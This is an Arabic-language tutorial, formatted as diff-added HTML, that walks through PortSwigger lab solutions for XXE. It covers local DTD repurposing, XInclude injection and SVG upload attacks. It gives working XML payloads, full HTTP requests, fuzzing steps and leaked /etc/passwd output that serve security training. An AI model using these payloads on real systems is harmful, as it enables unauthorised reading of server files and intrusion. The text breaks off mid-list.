+<p><strong>السطر الأخير (<code>%local_dtd;</code>):</strong> ده سطر التنفيذ. السيرفر هيروح يقرأ الملف اللي على جهازه، ولما ييجي يقرأ المتغير اللي اسمه <code>custom_entity</code>، هيلاقينا إحنا مغيّرين قيمته بالكود الخبيث، فهينفذه، ويضرب Error، ويطبعلنا ملف الباسوردات على الشاشة!</p>
+</li>
+</ol>
+<h3 id="dtd-reconnaissance">🔍 إزاي نلاقي ملف الـ DTD المحلي أصلاً؟ (Reconnaissance)</h3>
+<p>بما إنك مش شايف سيرفر الضحية، إنت بتخمن وتجرب (Fuzzing). بتبعت مسارات مشهورة لملفات DTD زي المثال ده:</p>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [
+&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+%local_dtd;
+]&gt;
+</code></pre>
+<p>لو السيرفر رد عليك بـ Error بيقول <code>No such file or directory</code>، يبقى الملف مش موجود. لو ماردش بـ Error يخص الملف (أو رد بـ Error في حتة تانية)، يبقى الملف ده موجود! بتروح إنت تدور على الملف ده في جوجل (أو GitHub) عشان تشوف الكود بتاعه وتعرف أسماء الـ Entities اللي جواه عشان تستخدم واحد فيهم وتعمله Override.</p>
+<hr />
+<h3 id="exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd">حل لاب Exploiting XXE to retrieve data by repurposing a local DTD :</h3>
+<p><strong>الهدف:</strong> سرقة محتوى ملف <code>/etc/passwd</code> عن طريق استدعاء ملف DTD محلي (<code>docbookx.dtd</code>) وإعادة تعريف المتغير <code>ISOamso</code> جواه بكود خبيث يسبب رسالة خطأ (Error-based) تفضح البيانات.</p>
+<h3 id="1-intercept">🎯 الخطوة 1: اصطياد الطلب (Intercept)</h3>
+<ol>
+<li>
+<p>افتح صفحة أي منتج في اللاب، واضغط على زرار <strong>"Check stock"</strong>.</p>
+</li>
+<li>
+<p>في برنامج Burp Suite، امسك الطلب (POST request) وابعته للـ <strong>Repeater</strong>.</p>
+</li>
+</ol>
+<h3 id="2-payload">💣 الخطوة 2: زرع الـ Payload المُهجن</h3>
+<p>هنيجي في الطلب جوه الـ Repeater، وتحت سطر الـ <code>&lt;?xml ... ?&gt;</code> وفوق التاج بتاع <code>&lt;stockCheck&gt;</code>، هنحط الـ Payload ده بالظبط:</p>
+<p>XML</p>
+<pre><code>&lt;!DOCTYPE foo [
+&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+&lt;!ENTITY % ISOamso '
+&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+&amp;#x25;eval;
+&amp;#x25;error;
+'&gt;
+%local_dtd;
+]&gt;
+</code></pre>
+<p><strong>🔍 تحليل سريع للـ Payload قبل ما نبعته:</strong></p>
+<ul>
+<li>
+<p>استدعينا ملف الـ <code>docbookx.dtd</code> المحلي.</p>
+</li>
+<li>
+<p>استهدفنا المتغير <code>ISOamso</code> (اللي موجود أصلاً جوه الملف ده) وعملناله إعادة تعريف (Redefine).</p>
+</li>
+<li>
+<p>حطينا جواه كود הـ Error-based اللي بيقرأ ملف الباسوردات وبيحاول يفتح مسار وهمي اسمه <code>/nonexistent/</code>.</p>
+</li>
+<li>
+<p>في الآخر، طلبنا تنفيذ <code>%local_dtd;</code> عشان السيرفر يقرأ الملف بالمتغيرات اللي عدلناها.</p>
+</li>
+</ul>
+<h3 id="3">💥 الخطوة 3: التنفيذ وحصد البيانات</h3>
+<ol>
+<li>
+<p>اضغط على زرار <strong>Send</strong> في الـ Repeater.</p>
+</li>
+<li>
+<p>بص على شاشة الـ <strong>Response</strong> على اليمين. هتلاقي السيرفر ضرب <strong>500 Internal Server Error</strong>.</p>
+</li>
+<li>
+<p>جوه رسالة الخطأ دي، هتلاقي السيرفر بيشتكي إنه مش عارف يلاقي المسار الوهمي، وقام طابعلك محتوى ملف الباسوردات بالكامل في وشك بالشكل ده:</p>
+</li>
+</ol>
+<p>Plaintext</p>
+<pre><code>java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin...
+</code></pre>
+<p><strong>مبروك!</strong> اللاب هيعلم معاك "Solved" فوراً. إنت كده قدرت تتخطى منع الاتصالات الخارجية (OAST) ومنع قراءة 
+الـ External DTDs، وسرقت البيانات من قلب السيرفر وهو متقفل!</p>
+<hr />
+<p>طيب في كام سؤال جه في دماغي كده أولهم ازاي اعرف احنا شغالين علي نظام ايه و ايه البيئة الشغال بيها و بعدها ليه أستخدمنا ISOamso Entity ؟</p>
+<h3 id="_9">==اجابة السؤال الاول :==</h3>
+<p>في بيئة اللابات (زي PortSwigger)، إحنا بنبقى عارفين مسبقاً إن السيرفر شغال بـ Linux وعليه GNOME عشان اللاب مصمم يختبر فهمك للثغرة نفسها. لكن على أرض الواقع في الـ <strong>Black-Box Penetration Testing</strong>، إنت بتتعامل مع "صندوق أسود"، ولازم تعمل مرحلة <strong>Enuemration &amp; Fingerprinting</strong> (جمع المعلومات وبصمة النظام) عشان تكتشف البيئة دي بنفسك.</p>
+<p>في الحقيقة، إنت بتستخدم الثغرة نفسها (الـ XXE) كجهاز "سونار" أو Oracle عشان تكتشف الملفات والبيئة، بجانب شوية تقنيات تانية في الـ Recon. إليك الطريقة اللي بنشتغل بيها على أرض الواقع:</p>
+<h3 id="1-recon-information-disclosure">1️⃣ الاستكشاف الأولي (Recon &amp; Information Disclosure)</h3>
+<p>قبل ما تضرب الثغرة، إنت بتجمع أدلة من التطبيق نفسه:</p>
+<ul>
+<li>
+<p><strong>HTTP Headers:</strong> بص على الـ Response في Burp Suite، ساعات السيرفر بيفضح نفسه في الـ Headers زي: <code>Server: Apache/2.4.41 (Ubuntu)</code> (كده عرفنا إنه لينكس). <code>Server: Microsoft-IIS/10.0</code> (كده متأكدين إنه ويندوز).</p>
+</li>
+<li>
+<p><strong>Verbose Errors:</strong> لو حاولت تدخل مسار غلط في الموقع وطلعلك Error بيقولك <code>C:\inetpub\wwwroot</code>، يبقى ويندوز. لو قالك <code>/var/www/html</code>، يبقى لينكس.</p>
+</li>
+</ul>
+<h3 id="2-fuzzing-dtd">2️⃣ استخدام الـ Fuzzing لاكتشاف ملفات الـ DTD</h3>
+<p>بما إننا عرفنا إن رسالة الخطأ بتتغير بناءً على وجود الملف من عدمه، إحنا مش بنخمن يدوي. إحنا بنحول الطلب لـ <strong>Burp Intruder</strong> ونعمل Fuzzing!</p>
+<p><strong>الخطوات العملية في Burp Intruder:</strong></p>
+<ol>
+<li>
+<p>بتبعت الـ Payload بتاع الـ Repurposing للـ Intruder.</p>
+</li>
+<li>
+<p>بتعمل Highlight (تحديد) على مسار الملف: <code>&lt;!ENTITY % local_dtd SYSTEM "file:///§/usr/share/yelp/dtd/docbookx.dtd§"&gt;</code></p>
+</li>
+<li>
+<p>بتجيب <strong>Wordlist</strong> (قائمة جاهزة) بتحتوي على مئات المسارات المشهورة لملفات الـ DTD في مختلف الأنظمة (Linux, Windows, Tomcat, Java, GNOME، الخ).</p>
+</li>
+<li>
+<p>بتشغل الـ Intruder وتراقب حجم الـ Response (Length) أو الـ Status Code.</p>
+</li>
+</ol>
+<h3 id="3-intruder-the-oracle">3️⃣ كيف تقرأ نتائج الـ Intruder؟ (The Oracle)</h3>
+<p>الـ XML Parser هنا شغال معاك كـ "مُخبر":</p>
+<ul>
+<li>
+<p><strong>لو الملف مش موجود:</strong> السيرفر هيرد برسالة خطأ واضحة زي <code>FileNotFoundException</code> أو <code>No such file or directory</code>.</p>
+</li>
+<li>
+<p><strong>لو الملف موجود:</strong> السيرفر هيحاول يقرأ الملف، وساعتها رسالة الخطأ هتتغير تماماً. إما هيطلعلك خطأ في الساينتكس بتاع الـ XML نفسه (لأنه بيحاول يدمج الملف بتاعك مع الملف المحلي)، أو ممكن السيرفر يرد بـ <code>200 OK</code> بس بـ Error مختلف.</p>
+</li>
+</ul>
+<p>بمجرد ما تلاقي استجابة مختلفة (Anomaly) في الـ Intruder، بتعرف إن المسار ده <strong>موجود فعلاً</strong> على السيرفر. بتاخد المسار ده، تبحث عنه في جوجل أو GitHub، وتشوف الكود بتاعه وتطلع منه اسم Entity عشان تعملها Override وتنفذ الهجوم بتاعك.</p>
+<h3 id="_10">==اجابة السؤال الثاني :==</h3>
+<p><strong>إحنا مش مجبرين على <code>ISOamso</code> تحديداً!</strong> تقدر تستخدم أي Entity تاني موجود جوه ملف <code>docbookx.dtd</code>. اسم <code>ISOamso</code> هو مجرد "مثال شهير" الباحثين استخدموه في الورقة البحثية بتاعتهم، وموقع PortSwigger اعتمده في الحل الرسمي.</p>
+<p>تعالى أشرحلك السر ورا اختيار الاسم ده، وليه لازم نختار اسم موجود فعلاً جوه الملف:</p>
+<h3 id="xml-first-come-first-served">🧠 قاعدة "الأسبقية" في الـ XML (First Come, First Served)</h3>
+<p>لغة الـ XML عندها قاعدة صارمة: لو تم تعريف متغير (Entity) مرتين، الـ Parser بياخد <strong>أول تعريف شافه ويتجاهل التاني</strong>.</p>
+<p>إحنا بنستغل القاعدة دي عشان ننفذ الهجوم كالتالي:</p>
+<ol>
+<li>
+<p>إحنا بنكتب جوه الطلب بتاعنا (Internal DTD) تعريف خبيث لمتغير اسمه <code>ISOamso</code>.</p>
+</li>
+<li>
+<p>بعدين بنأمر السيرفر يروح يقرأ ملف <code>docbookx.dtd</code> الموجود على الهارد بتاعه (External DTD).</p>
+</li>
+<li>
+<p>لما السيرفر يفتح ملف <code>docbookx.dtd</code> ويبدأ يقرأه، هيلاقي إن الملف ده من جواه بيحاول يعرّف متغير اسمه <code>ISOamso</code> (لأنه متغير شرعي وأساسي جوه الملف ده).</p>
+</li>
+<li>
+<p>هنا الـ Parser هيقول: <em>"لحظة واحدة! أنا المستخدم لسه مديني تعريف للمتغير ده من شوية، أنا هتجاهل التعريف الشرعي اللي جوه الملف، وهنفذ التعريف بتاع المستخدم (اللي هو الكود الخبيث بتاعنا)!"</em>.</p>
+</li>
+</ol>
+<h3 id="isoamso">🔍 إزاي الباحثين عرفوا إن فيه متغير اسمه <code>ISOamso</code>؟</h3>
+<p>ملف <code>docbookx.dtd</code> ده ملف Open Source (مفتوح المصدر) وموجود في كل توزيعات لينكس اللي بتستخدم واجهة GNOME.</p>
+<p>الباحث (Arseniy Sharoglazov) اللي اكتشف الثغرة دي عمل الآتي:</p>
+<ol>
+<li>
+<p>نزل ملف <code>docbookx.dtd</code> من على النت وفتحه عنده على الجهاز.</p>
+</li>
+<li>
+<p>فحص الكود المكتوب جواه، ولقى إنه بيستدعي ملفات تانية فرعية، والملفات دي مليانة متغيرات (Parameter Entities) بتُستخدم عشان ترسم رموز معينة (زي حقوق النشر، أو الرموز الرياضية).</p>
+</li>
+<li>
+<p>لقى قائمة طويلة من المتغيرات زي: <code>ISOamso</code>, <code>ISOamsa</code>, <code>ISOtech</code>, <code>ISOnum</code> وغيرها.</p>
+</li>
+<li>
+<p>اختار <code>ISOamso</code> بشكل عشوائي عشان يعمل عليه الـ Override، واكتشف إن الـ Parser بمجرد ما بيقرأ الملف الخارجي بيقوم منفذ الكود الخبيث فوراً ويفضح البيانات.</p>
+</li>
+</ol>
+<h3 id="_11">🎯 الخلاصة:</h3>
+<p>الشرط الوحيد لنجاح الهجوم ده (Repurposing) هو إنك <strong>تستهدف متغير (Entity) يكون فعلاً مكتوب ومُستدعى جوه ملف الـ DTD المحلي اللي إنت بتخليه يقرأه</strong>. لو كتبت اسم متغير من دماغك (مثلاً <code>%marwan_entity</code>)، السيرفر مش هينفذه، لأن ملف الـ <code>docbookx.dtd</code> ميعرفش حاجة عن الاسم ده ومش هيحاول يشغله وهو بيقرأ الكود بتاعه.</p>
+<p><strong>==----و بكده نكون خلصنا جزء ال BLIND XXE----==</strong></p>
+<hr />
+<h3 id="finding-hidden-attack-surface-for-xxe-injection">Finding hidden attack surface for XXE injection :</h3>
+<p>ندخل بقى على مستوى جديد من التخفي! التكنيك ده بيحل مشكلة بتواجهنا كتير: "إزاي أعمل XXE Injection والطلب (Request) أصلاً مفيهوش XML؟"</p>
+<p>تعالى نفصص المقال ده لأنه بيشرح واحدة من أذكى طرق اكتشاف "مساحات الهجوم المخفية" (Hidden Attack Surface):</p>
+<h3 id="xml">المشكلة: اختفاء الـ XML من الطلب</h3>
+<p>في الحالات العادية اللي اتكلمنا عنها قبل كده، إنت بتشوف الطلب مبعوت بصيغة XML واضحة، فبتقدر تعدل براحتك وتضيف الـ <code>DOCTYPE</code> في أوله.</p>
+<p>لكن أحياناً، التطبيق بياخد منك بيانات عادية جداً (مثلاً بتدخل اسمك في فورم <code>name=Ahmed</code>). السيرفر بقى بياخد كلمة <code>Ahmed</code> دي، ويبني هو بيها ملف XML كامل في الـ Back-end (عشان يبعته لخدمة تانية داخلية زي SOAP Service)، وبعدين يعمل قراءة (Parse) للملف ده.</p>
+<h3 id="xxe">ليه الـ XXE العادي بيفشل هنا؟</h3>
+<p>بما إنك مش بتتحكم في ملف الـ XML كله (إنت بس بتتحكم في حتة صغيرة جواه وهي البيانات اللي دخلتها)، فمش هتقدر تحط تاج الـ <code>&lt;!DOCTYPE&gt;</code> لأنه لازم يتكتب في <strong>أول سطر</strong> في ملف الـ XML. لو حاولت تحطه في النص مكان بياناتك، الـ Parser هيطلع Error ويرفض الملف تماماً.</p>
+<h3 id="xinclude">الحل البديل: هجوم الـ XInclude</h3>
+<p>هنا بييجي دور ميزة شرعية في لغة الـ XML اسمها <strong>XInclude</strong>. الميزة دي معمولة عشان تسمح للمطورين إنهم يبنوا ملف XML كبير عن طريق دمج أو استدعاء ملفات تانية جواه (زي فكرة الـ <code>include</code> في البرمجة).</p>
+<p>الميزة الرهيبة في الـ XInclude إنك تقدر تستخدمها <strong>في أي مكان جوه الملف</strong> (مش شرط في الأول زي الـ DOCTYPE). يعني تقدر تحطها مكان بياناتك العادية، ولما السيرفر يجي يبني الملف، هيلاقي أمر الدمج ده وينفذه.</p>
+<h3 id="payload">🚀 تحليل الـ Payload</h3>
+<p>عشان ننفذ الهجوم ده، بنبعت الكود ده مكان البيانات العادية بتاعتنا في الطلب:</p>
+<p>XML</p>
+<pre><code>&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
+&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;
+</code></pre>
+<p><strong>إيه اللي بيحصل في السطرين دول؟</strong></p>
+<ol>
+<li>
+<p><strong><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;</code></strong>: إحنا هنا بنفتح تاج وهمي (سميناه <code>foo</code>)، وبنستدعي جواه مكتبة الأوامر (Namespace) الخاصة بالـ XInclude من الرابط الرسمي بتاعها. الخطوة دي بتفهم السيرفر إننا هنستخدم أوامر دمج.</p>
+</li>
+<li>
+<p><strong><code>&lt;xi:include ... /&gt;</code></strong>: ده أمر الدمج نفسه اللي بيبدأ ينفذ المطلوب.</p>
+</li>
+<li>
+<p><strong><code>parse="text"</code></strong>: هنا بنأمر السيرفر: "لو سمحت، الملف اللي هطلبه منك اتعامل معاه كنص عادي (Text) مش ككود XML، عشان متلخبطش الـ Parser".</p>
+</li>
+<li>
+<p><strong><code>href="file:///etc/passwd"</code></strong>: ده المسار بتاع الملف السري اللي إحنا عاوزين نقرأه. السيرفر هيروح يقرأ الملف ده، ويحط محتواه بالكامل مكان الـ Payload بتاعنا!</p>
+</li>
+</ol>
+<h3 id="_12">الخلاصة</h3>
+<p>لما تلاقي تطبيق بياخد منك بيانات عادية (URL-encoded أو فورم عادي) وتشك إنه بيحولها لـ XML في الكواليس، جرب تستخدم كود الـ XInclude. لو السيرفر مصاب والثغرة موجودة، هينفذ أمر الدمج ويرجعلك محتوى الملف السري اللي طلبته جوه الـ Response اللي بيظهرلك في الشاشة.</p>
+<hr />
+<h3 id="exploiting-xinclude-to-retrieve-files">حل لاب Exploiting XInclude to retrieve files :</h3>
+<p><strong>الهدف من اللاب:</strong> سرقة ملف <code>/etc/passwd</code> من سيرفر يظهر أنه يستقبل بيانات عادية (Form Data)، ولكن عبر مرحلة الـ Recon وفحص الأكواد، نكتشف أنه يحقنها جوه قالب XML مستخبي في الـ Back-end.</p>
+<h3 id="reconnaissance-source-code-review">🔍 المرحلة الأولى: الاستكشاف المتقدم (Reconnaissance &amp; Source Code Review)</h3>
+<p>على أرض الواقع، الطلب يظهر في Burp Suite كطلب عادي جداً بـ <code>Content-Type: application/x-www-form-urlencoded</code>. لمعرفة ما يحدث في الكواليس، قمنا بتحليل ملفات الـ JavaScript المرفقة بالموقع:</p>
+<ol>
+<li>
+<p>أثناء تصفح صفحة المنتج، قمنا بفتح الـ <strong>Developer Tools (F12)</strong> ثم تبويب <strong>Sources/Network</strong>.</p>
+</li>
+<li>
+<p>عثرنا على ملف السكريبت المسؤول عن ميزة فحص المخزون في هذا المسار: <code>https://0a3d0023033917e681ec253a006d00fb.web-security-academy.net/resources/js/stockCheck.js</code></p>
+</li>
+<li>
+<p>بتحليل كود الـ JavaScript وجدنا الآتي:</p>
+</li>
+</ol>
+<p>JavaScript</p>
+<pre><code>document.getElementById(&quot;stockCheckForm&quot;).addEventListener(&quot;submit&quot;, function(e) {
+    checkStock(this.getAttribute(&quot;method&quot;), this.getAttribute(&quot;action&quot;), new FormData(this));
+    e.preventDefault();
+});
+
+function checkStock(method, path, data) {
+    const retry = (tries) =&gt; tries == 0
+        ? null
+        : fetch(
+            path,
+            {
+                method,
+                headers: { 'Content-Type': window.contentType },
+                body: payload(data)
+            }
+          )
+// ... [باقي الكود]
+</code></pre>
+<p><strong>💡 ماذا استفدنا من الـ Recon؟</strong> الكود يثبت أن التطبيق يأخذ بارامترات عادية (<code>productId=1&amp;storeId=1</code>) ولكن المتغير <code>window.contentType</code> والدالة <code>payload(data)</code> تشير إلى إرسالها بطريقة معينة ليتم صياغتها داخل قالب XML في الـ Back-end. ولأننا نتحكم في قيمة الـ <code>productId</code> فقط (أي في منتصف مستند الـ XML وليس أوله)، فإن الـ XXE التقليدي سيفشل لأننا لا نستطيع كتابة <code>&lt;!DOCTYPE&gt;</code>.</p>
+<p><strong>الحل:</strong> استخدام تكتيك الـ <strong>XInclude</strong> الذي يمكن كتابته في أي مكان داخل ملف الـ XML.</p>
+<h3 id="_13">🚀 المرحلة الثانية: خطوات الحل العملية</h3>
+<h4 id="1-intercept_1">الخطوة 1: اصطياد الطلب (Intercept)</h4>
+<ol>
+<li>
+<p>من صفحة المنتج، اضغط على زرار <strong>"Check stock"</strong>.</p>
+</li>
+<li>
+<p>اصطاد الطلب في Burp Suite وانقله إلى شاشة الـ <strong>Repeater</strong>.</p>
+</li>
+</ol>
+<h4 id="2-payload_1">الخطوة 2: زرع الـ Payload الخبيث</h4>
+<p>تعال عند منطقة الـ Body في الأسفل، واحذف رقم المنتج وحط مكانه كود الـ XInclude التالي:</p>
+<p>XML</p>
+<pre><code>&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;
+</code></pre>
+<p><strong>شكل الطلب النهائي في الـ Repeater:</strong></p>
+<p>HTTP</p>
+<pre><code>POST /product/stock HTTP/2
+Host: target-vulnerable-app.net
+Content-Type: application/x-www-form-urlencoded
+
+productId=&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;&amp;storeId=1
+</code></pre>
+<blockquote>
+<p><strong>💡 تريكة احترافية لموقعك:</strong> حدد الكود الذي كتبته داخل بارامتر <code>productId</code> واضغط <code>Ctrl + U</code> في Burp Suite لعمل <strong>URL Encode</strong>. هذا يحول الرموز مثل <code>&lt;</code> و <code>&gt;</code> إلى <code>%3C</code> و <code>%3E</code> مما يضمن عبور الـ Payload بسلام من خادم الويب (Web Server) وصولاً للـ XML Parser الداخلي دون أن يتشوه الكود.</p>
+</blockquote>
+<h4 id="3_1">الخطوة 3: قراءة الملف وحل اللاب</h4>
+<ol>
+<li>
+<p>اضغط <strong>Send</strong> في الـ Repeater.</p>
+</li>
+<li>
+<p>بص على شاشة الـ <strong>Response</strong> على اليمين، ستجد السيرفر قام بدمج الملف بنجاح وطبع لك محتوى ملف الـ <code>/etc/passwd</code> بالكامل:</p>
+</li>
+</ol>
+<p>Plaintext</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+</code></pre>
+<p><strong>مبروك!</strong> تم حل اللاب وتوثيق الثغرة بأسلوب احترافي متكامل.</p>
+<h3 id="notes">🧠 كبسولة للمقارنة في الـ Notes بتاعتك:</h3>
+<p>بما إن الـ <code>Content-Type</code> هو <code>x-www-form-urlencoded</code>، الأفضل دايماً وأنت في الـ <strong>Repeater</strong> إنك تعمل تحديد (Highlight) للـ Payload بتاعك (من أول <code>&lt;foo&gt;</code> لحد <code>&lt;/foo&gt;</code>) وتضغط <code>Ctrl + U</code> عشان تعمله <strong>URL Encoding</strong>.</p>
+<p><strong>ليه؟</strong> عشان الرموز زي <code>&lt;</code> و <code>&gt;</code> والمسافات وعلامات التنصيص <code>"</code> ممكن تلخبط بعض السيرفرات (Web Servers) وترفض الطلب قبل ما يوصل أصلاً لمرحلة الـ XML Parser. الـ URL Encoding بيضمن إن الكود يوصل سليم 100% للـ Back-end.</p>
+<p>بمجرد ما تضغط <strong>Send</strong>، هتلاقي الـ Response رجعلك بـ 200 OK أو Error، وجواه محتوى ملف الـ <code>/etc/passwd</code> بالكامل. مبروك حل اللاب!  (هو انا محتجتش أعمل URL Encode و اشتغل معايا بس ده كان علشان هو لاب بس في أرض الواقع هتحتاج تعمل URL Encode )</p>
+<hr />
+<h3 id="xxe-attacks-via-file-upload">XXE attacks via file upload :</h3>
+<p>تخيل إنك بتعمل هانتينج في برامج الـ Bug Bounty زي Wickr، ولقيت خاصية بسيطة جداً لتغيير "صورة البروفايل" أو رفع ملفات عادية. في الطبيعي إنت مش هتشك إن في هنا ثغرة XXE لأن مفيش أي XML مبعوت في الطلب، صح؟ هنا بقى بتيجي فكرة الـ <strong>XXE via File Upload</strong>.</p>
+<p>تعالى نفصص الفكرة دي عشان تضيفها لأسلحتك:</p>
+<h3 id="xml-based-formats">🖼️ السر كله في نوع الملف (XML-based Formats)</h3>
+<p>فيه ملفات إحنا بنتعامل معاها كل يوم على إنها صور أو مستندات، لكنها من جوه في الحقيقة مبنية بالكامل على لغة الـ XML. أشهر مثالين على ده:</p>
+<ol>
+<li>
+<p><strong>صور الـ SVG (Scalable Vector Graphics):</strong> دي مش صور مكونة من بيكسلات زي الـ PNG أو الـ JPEG، دي عبارة عن كود XML بيرسم أشكال هندسية.</p>
+</li>
+<li>
+<p><strong>ملفات الـ DOCX أو XLSX:</strong> ملفات الوورد والإكسيل دي لو فكيت الضغط بتاعها (Unzip)، هتلاقيها من جوه عبارة عن مجموعة ملفات XML متجمعة مع بعض.</p>
+</li>
+</ol>
+<h3 id="backend">🧠 خدعة الـ Backend (ثغرة مكتبات الصور)</h3>
+<p>لما الموقع بيقولك "مسموح ترفع صور PNG أو JPEG بس"، إنت ممكن تغير امتداد ملف SVG وتخليه <code>.jpeg</code> وترفعه.</p>
+<p><strong>إيه اللي بيحصل في الكواليس؟</strong> التطبيق بياخد الملف بتاعك ويبعته لمكتبة معالجة الصور في السيرفر (Image Processing Library زي ImageMagick أو Apache Batik) عشان مثلاً تعمل Resize للصورة أو تتأكد إنها سليمة.</p>
+<p>المكتبات دي غالباً بتبقى <strong>متقبلة لملفات الـ SVG افتراضياً</strong>. ولأن الـ SVG هو في الأساس XML، المكتبة هتبدأ تقرأ الكود (Parsing) سطر سطر عشان ترسم الصورة. وهنا، لو السيرفر مش متأمن، هيقرأ الـ Payload الخبيث بتاعك اللي مستخبي جوه كود الرسم!</p>
+<h3 id="the-execution">💣 إزاي بنستغلها؟ (The Execution)</h3>
+<p>إحنا بنكتب كود SVG بسيط جداً وظيفته إنه يرسم مربع أو نص، بس بنحط في أوله <code>&lt;!DOCTYPE&gt;</code> بيستدعي ملف <code>/etc/passwd</code>. وبنخلي الـ SVG بدل ما يكتب نص عادي جوه الصورة، يكتب محتوى المتغير اللي جاب الداتا من السيرفر.</p>
+<p>لما السيرفر يعالج الصورة ويعرضها ليك في البروفايل، هتتفاجئ إن <strong>صورة البروفايل بتاعتك بقى مرسوم جواها محتوى ملف الباسوردات</strong>!</p>
+<p>التكنيك ده بيعتبر من أقوى الـ Bypasses لو الموقع حاطط Firewalls عنيفة على الـ Requests العادية، لأنك بتدخل الـ Payload بتاعك جوه "صورة" وبتهربه من كل الدفاعات دي.</p>
+<hr />
+<h3 id="exploiting-xxe-via-image-file-upload">حل لاب Exploiting XXE via image file upload :</h3>
+<p><strong>الهدف من اللاب:</strong> استغلال خاصية رفع الصور (Avatars) في التعليقات لرفع ملف SVG خبيث، لإجبار مكتبة معالجة الصور في السيرفر على قراءة ملف <code>/etc/hostname</code> ورسم محتواه كجزء من الصورة.</p>
+<h3 id="behind-the-scenes-svg">🕵️‍♂️ الميكانيكا (Behind the Scenes): ليه الـ SVG؟</h3>
+<p>في الكثير من الأحيان، تطبيقات الويب تسمح برفع الصور بصيغ معينة (مثل PNG و JPEG) ولكنها تعتمد في الكواليس على مكتبات معالجة صور (Image Processing Libraries) تدعم صيغة <strong>SVG</strong> افتراضياً.</p>
+<p>الـ SVG (Scalable Vector Graphics) ليس صورة نقطية (Pixels) بل هو في الأساس <strong>مستند XML</strong> يحتوي على أوامر هندسية لرسم الأشكال والنصوص. وبما أنه يعتمد على XML، فيمكننا ببساطة حقن <code>&lt;!DOCTYPE&gt;</code> لتعريف كيان خارجي (External Entity) يقرأ ملفات النظام، ثم نأمر الـ SVG بطباعة هذا الكيان كنص مرسوم داخل الصورة.</p>
+<p>عندما يعالج السيرفر الصورة لعرضها، سيقوم بتنفيذ كود الـ XML، ويقرأ الملف، ويرسم محتواه، وبذلك نسترد البيانات بمجرد عرض صورتنا الشخصية!</p>
+<h3 id="payload-the-malicious-svg">💣 الـ Payload المستخدم (The Malicious SVG)</h3>
+<p>افتح أي محرر نصوص عندك، وانسخ الكود ده جواه، واحفظ الملف باسم <code>exploit.svg</code>:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;
+&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;
+   &lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+
+</code></pre>
+<p>** تفكيك Payload :**</p>
+<ul>
+<li>
+<p><code>&lt;!DOCTYPE test ...&gt;</code>: قمنا بتعريف كيان باسم <code>xxe</code> يقوم بقراءة مسار السيرفر <code>/etc/hostname</code>.</p>
+</li>
+<li>
+<p><code>&lt;svg ...&gt;</code>: التيجان الأساسية لملف الـ SVG لتحديد أبعاده وإصدار الـ XML.</p>
+</li>
+<li>
+<p><code>&lt;text ...&gt;&amp;xxe;&lt;/text&gt;</code>: هنا نأمر مكتبة معالجة الصور برسم نص عادي (Text)، ولكن بدلاً من كتابة نص ثابت، مررنا له الكيان <code>&amp;xxe;</code>، ليقوم بطباعة محتوى الملف السري داخل الصورة بحجم خط 16.</p>
+</li>
+</ul>
+<h3 id="exploitation-steps">خطوات التنفيذ (Exploitation Steps)</h3>
+<h4 id="1">الخطوة 1: حقن الملف في التطبيق</h4>
+<ol>
+<li>
+<p>ادخل على أي مقال (Blog Post) في موقع اللاب وانزل لخانة التعليقات.</p>
+</li>
+<li>
+<p>املأ بيانات التعليق العادية (الاسم، الإيميل، الموقع).</p>
+</li>
+<li>
+<p>في خانة رفع الصورة (Avatar)، اضغط Browse واختار ملف <code>exploit.svg</code> اللي لسه مجهزينُه.</p>
+</li>
+<li>
+<p>اضغط <strong>Post Comment</strong>.</p>
+</li>
+</ol>
+<h4 id="2-data-exfiltration">الخطوة 2: حصد الغنائم (Data Exfiltration)</h4>
+<ol>
+<li>
+<p>بعد ما التعليق يتنشر، ارجع لنفس المقال وانزل للتعليق بتاعك.</p>
+</li>
+<li>
+<p>هتلاقي الصورة الشخصية (Avatar) بتاعتك ظاهرة. اضغط عليها كليك يمين واختار <strong>"Open image in new tab"</strong> (أو ممكن تفتح الـ HTTP History في Burp Suite وتشوف الـ Response بتاع الصورة).</p>
+</li>
+<li>
+<p>لما الصورة تفتح بحجمها الطبيعي، هتلاقي الـ Hostname بتاع السيرفر (مكون من حروف وأرقام عشوائية) <strong>مكتوب ومرسوم جوه الصورة نفسها</strong>!</p>
+</li>
+</ol>
+<h4 id="3_2">الخطوة 3: إنهاء اللاب</h4>
+<ol>
+<li>
+<p>انسخ الـ Hostname اللي ظهرلك في الصورة.</p>
+</li>
+<li>
